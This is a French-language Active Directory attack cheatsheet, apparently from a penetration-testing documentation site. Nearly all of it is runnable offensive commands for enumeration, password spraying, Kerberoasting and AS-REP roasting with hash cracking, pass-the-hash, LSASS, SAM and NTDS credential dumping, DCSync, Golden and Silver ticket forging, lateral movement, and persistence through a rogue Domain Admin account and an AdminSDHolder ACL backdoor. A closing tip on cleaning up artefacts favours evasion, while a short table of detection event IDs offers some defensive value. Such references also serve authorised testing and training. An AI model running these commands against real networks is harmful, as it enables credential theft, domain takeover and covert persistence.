# Active Directory Cheatsheet

Référence rapide des commandes et techniques essentielles pour les attaques et l'énumération Active Directory.


## Enumération Initiale

::: code-group
```bash [NetExec]
# Scan SMB
nxc smb <target>
nxc smb 192.168.1.0/24

# Info domaine
nxc smb <DC> -u user -p password --pass-pol
nxc smb <DC> -u user -p password --users
nxc smb <DC> -u user -p password --groups
nxc smb <DC> -u user -p password --computers
nxc smb <DC> -u user -p password --shares

# Null session
nxc smb <DC> -u '' -p ''
nxc smb <DC> -u 'guest' -p ''
```
```bash [Enum4linux]
# Full enum
enum4linux -a <DC>

# Utilisateurs
enum4linux -U <DC>

# Partages
enum4linux -S <DC>

# Politique mdp
enum4linux -P <DC>
```
```bash [LDAP]
# RootDSE
ldapsearch -x -H ldap://<DC> -s base namingcontexts

# Null bind
ldapsearch -x -H ldap://<DC> -b "dc=domain,dc=com"

# Avec credentials
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName

# Utilisateurs sans pré-auth
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```
```bash [RPC]
# Null session
rpcclient -U "" -N <DC>

# Avec credentials
rpcclient -U "user%password" <DC>

# Commandes utiles
enumdomusers
enumdomgroups
querydominfo
getdompwinfo
enumprivs
```

:::


## Collecte d'Informations Domaine
```bash
# Info domaine complet
nxc ldap <DC> -u user -p password --get-sid
nxc ldap <DC> -u user -p password --trusted-for-delegation
nxc ldap <DC> -u user -p password --password-not-required
nxc ldap <DC> -u user -p password --admin-count

# Dump LDAP complet
ldapdomaindump <DC> -u 'domain\user' -p password -o /tmp/ldap_dump

# BloodHound ingestor
bloodhound-python -u user -p password -d domain.com -dc <DC> -c all -o /tmp/bh
```


## BloodHound - Requêtes Cypher
```
 # Comptes Kerberoastables
 MATCH (u:User {hasspn:true}) RETURN u

 # Comptes AS-REP Roastables
 MATCH (u:User {dontreqpreauth:true}) RETURN u

 # Chemin vers Domain Admins
 MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p

 # Admins locaux
 MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u,c

 # Délégations non contraintes
 MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

 # Sessions actives des DA
 MATCH (u:User)-[:MemberOf]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}),
 (u)-[:HasSession]->(c:Computer) RETURN u,c

 # Chemins depuis un user compromis
 MATCH p=shortestPath((u:User {name:"USER@DOMAIN.COM"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p
```


## Credential Attacks

### Password Spraying

::: code-group
```bash [NetExec]
# SMB
nxc smb <DC> -u users.txt -p Password123! --continue-on-success

# LDAP
nxc ldap <DC> -u users.txt -p Password123! --continue-on-success

# WinRM
nxc winrm <target> -u users.txt -p Password123! --continue-on-success
```
```bash [Kerbrute]
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123!
```
```powershell [DomainPasswordSpray]
Invoke-DomainPasswordSpray -Password Password123! -OutFile results.txt
```

:::

### Bruteforce
::: code-group
```bash [Hydra]
# Hydra SMB
hydra -L users.txt -P passwords.txt smb://<target>
```
```bash [Kerbrute]
# Kerbrute bruteforce
kerbrute bruteuser -d domain.com --dc <DC> passwords.txt <username>
```
:::

## Kerberos Attacks

### Kerberoasting

::: code-group
```bash [Impacket]
# Lister les SPNs
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC>

# Dump hashes
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC> -request -outputfile kerberoast.txt
```
```bash [NetExec]
nxc ldap <DC> -u user -p password --kerberoasting kerberoast.txt
```
```bash [Rubeus - Windows]
Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat
```

:::
```bash
# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting

::: code-group
```bash [Impacket]
# sans compte
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC> -outputfile asrep.txt

# avec compte
impacket-GetNPUsers domain.com/user:password -dc-ip <DC> -request -outputfile asrep.txt
```
```bash [NetExec]
nxc ldap <DC> -u user -p password --asreproast asrep.txt
```
```bash [Rubeus - Windows]
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```
:::

```bash
# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```


## Hash Attacks

### Pass-the-Hash

::: code-group
```bash [Impacket PSExec]
impacket-psexec domain/user@<target> -hashes :NTLMhash
```
```bash [Impacket WMIExec]
impacket-wmiexec domain/user@<target> -hashes :NTLMhash
```
```bash [NetExec]
nxc smb <target> -u user -H NTLMhash
nxc smb <target> -u user -H NTLMhash -x "whoami"
```
```bash [Evil-WinRM]
evil-winrm -i <target> -u user -H NTLMhash
```
```bash [Mimikatz - Windows]
sekurlsa::pth /user:user /domain:domain.com /ntlm:NTLMhash /run:cmd.exe
```

:::

### Overpass-the-Hash
```bash
# Impacket obtenir un TGT avec le hash
impacket-getTGT domain.com/user -hashes :NTLMhash -dc-ip <DC>

# Utiliser le ticket
export KRB5CCNAME=/tmp/user.ccache
impacket-psexec domain.com/user@<target> -k -no-pass
```

### Pass-the-Ticket
```bash
# Lister les tickets
klist

# Importer un ticket
export KRB5CCNAME=/tmp/ticket.ccache

# Utiliser le ticket
impacket-psexec domain.com/user@<target> -k -no-pass
impacket-wmiexec domain.com/user@<target> -k -no-pass
```


## Dump de Credentials

::: code-group
```bash [SAM admin local]
# Impacket
impacket-secretsdump domain/user:password@<target> -sam

# NetExec
nxc smb <target> -u user -p password --sam
```
```bash [LSASS hashes en mémoire]
# NetExec + lsassy
nxc smb <target> -u user -p password -M lsassy

# Impacket
impacket-secretsdump domain/user:password@<target>
```
```bash [NTDS contrôleur de domaine]
# Impacket DCSync
impacket-secretsdump domain/user:password@<DC> -just-dc-ntlm

# Tous les hashes
impacket-secretsdump domain/user:password@<DC> -just-dc

# NetExec
nxc smb <DC> -u user -p password --ntds
```
```bash [Mimikatz]
# NTLM hashes
sekurlsa::logonpasswords

# Tickets Kerberos
sekurlsa::tickets /export
kerberos::list /export

# DCSync
lsadump::dcsync /domain:domain.com /user:Administrator
lsadump::dcsync /domain:domain.com /all
```

:::


## DCSync
```bash
# Via Impacket
impacket-secretsdump domain/user:password@<DC> -just-dc-user Administrator
impacket-secretsdump domain/user:password@<DC> -just-dc-ntlm

# Via NetExec
nxc smb <DC> -u user -p password --ntds

# Via Mimikatz (sur le DC)
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv
```


## Golden & Silver Ticket

### Golden Ticket
```bash
# Récupérer le hash krbtgt
impacket-secretsdump domain/user:password@<DC> -just-dc-user krbtgt

# Créer le Golden Ticket Mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# Via Impacket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.com Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.com/Administrator@<DC> -k -no-pass
```

### Silver Ticket
```bash
# Créer le Silver Ticket Mimikatz
kerberos::golden /user:user /domain:domain.com /sid:<DOMAIN_SID> \
  /target:<target> /service:cifs /rc4:<SERVICE_HASH> /ptt

# Via Impacket
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> \
  -domain domain.com -spn cifs/<target> user
```


## Mouvement Latéral

::: code-group
```bash [PSExec]
impacket-psexec domain/user:password@<target>
impacket-psexec domain/user@<target> -hashes :NTLMhash
```
```bash [WMIExec]
impacket-wmiexec domain/user:password@<target>
impacket-wmiexec domain/user@<target> -hashes :NTLMhash
```
```bash [SMBExec]
impacket-smbexec domain/user:password@<target>
```
```bash [ATExec]
impacket-atexec domain/user:password@<target> "whoami"
```
```bash [Evil-WinRM]
evil-winrm -i <target> -u user -p password
evil-winrm -i <target> -u user -H NTLMhash
```
```bash [NetExec]
nxc smb <target> -u user -p password -x "whoami"
nxc winrm <target> -u user -p password -x "whoami"
```

:::



## Enumération Post-Compromission
```bash
# Droits sur les objets AD
nxc ldap <DC> -u user -p password --gmsa
nxc ldap <DC> -u user -p password --delegate

# Sessions actives
nxc smb 192.168.1.0/24 -u user -p password --sessions
nxc smb 192.168.1.0/24 -u user -p password --loggedon-users

# Admin local sur quelles machines
nxc smb 192.168.1.0/24 -u user -p password --local-auth

# Shares accessibles
nxc smb 192.168.1.0/24 -u user -p password --shares
```



## Persistence AD
```bash
# Ajouter un compte Domain Admin
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain

# Golden Ticket (persistance longue durée)
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:domain.com \
  /sid:<SID> /krbtgt:<hash> /ptt

# AdminSDHolder persistance via ACL
# Ajouter des droits sur AdminSDHolder
impacket-dacledit domain.com/DA_user:password@<DC> \
  -action write -rights FullControl -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=com" \
  -principal backdoor_user
```


## Hashes & Formats

| Format | Exemple | Usage |
|---|---|---|
| NTLM | `aad3b435b51404eeaad3b435b51404ee:hash` | PtH, secretsdump |
| NTHash seul | `:NThash` | Impacket |
| Kerberoast | `$krb5tgs$23$*...*` | Hashcat 13100 |
| AS-REP | `$krb5asrep$23$...*` | Hashcat 18200 |
| NetNTLMv1 | `user::domain:hash:hash:challenge` | Hashcat 5500 |
| NetNTLMv2 | `user::domain:hash:hash:challenge` | Hashcat 5600 |



## Hashcat — Modes AD

| Mode | Type | Commande |
|---|---|---|
| 1000 | NTLM | `hashcat -m 1000 hash.txt wordlist.txt` |
| 5500 | NetNTLMv1 | `hashcat -m 5500 hash.txt wordlist.txt` |
| 5600 | NetNTLMv2 | `hashcat -m 5600 hash.txt wordlist.txt` |
| 13100 | Kerberoast RC4 | `hashcat -m 13100 hash.txt wordlist.txt` |
| 18200 | AS-REP RC4 | `hashcat -m 18200 hash.txt wordlist.txt` |
| 19600 | Kerberoast AES128 | `hashcat -m 19600 hash.txt wordlist.txt` |
| 19700 | Kerberoast AES256 | `hashcat -m 19700 hash.txt wordlist.txt` |


## Event IDs — Détection

| Event ID | Description | Attaque associée |
|---|---|---|
| 4624 | Logon réussi | PtH, PtT |
| 4625 | Logon échoué | Password Spraying |
| 4648 | Logon credentials explicites | PtH |
| 4662 | Accès objet AD | DCSync |
| 4768 | TGT demandé | AS-REP Roasting |
| 4769 | TGS demandé | Kerberoasting |
| 4771 | Echec pré-auth Kerberos | AS-REP Roasting |
| 4776 | Validation NTLM | PtH, Spraying |
| 4798 | Enum groupes locaux | Enumération |
| 4799 | Enum membres groupes | Enumération |

---

::: info Tips 

- Commencer par BloodHound visualiser les chemins avant d'attaquer
- `nxc smb 192.168.1.0/24 -u user -p password` pour cartographier rapidement
- Prioriser les comptes kerberoastables membres de groupes privilégiés
- Toujours vérifier `--pass-pol` avant un password spray pour éviter les lockouts
- DCSync nécessite les droits `Replicating Directory Changes` vérifier avec BloodHound
- Un hash krbtgt permet un Golden Ticket valable 10 ans par défaut
- Nettoyer les artefacts tickets Kerberos, fichiers temporaires, comptes créés

:::

## Notes
```
 # Notes terrain
```

## Tools

- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit)



## Ressources

- [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [The Hacker Recipes AD](https://www.thehacker.recipes/ad/)
- [PayloadsAllTheThings AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [adsecurity.org](https://adsecurity.org/)




<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/cheatsheets/active-directory.md)</span>

</div>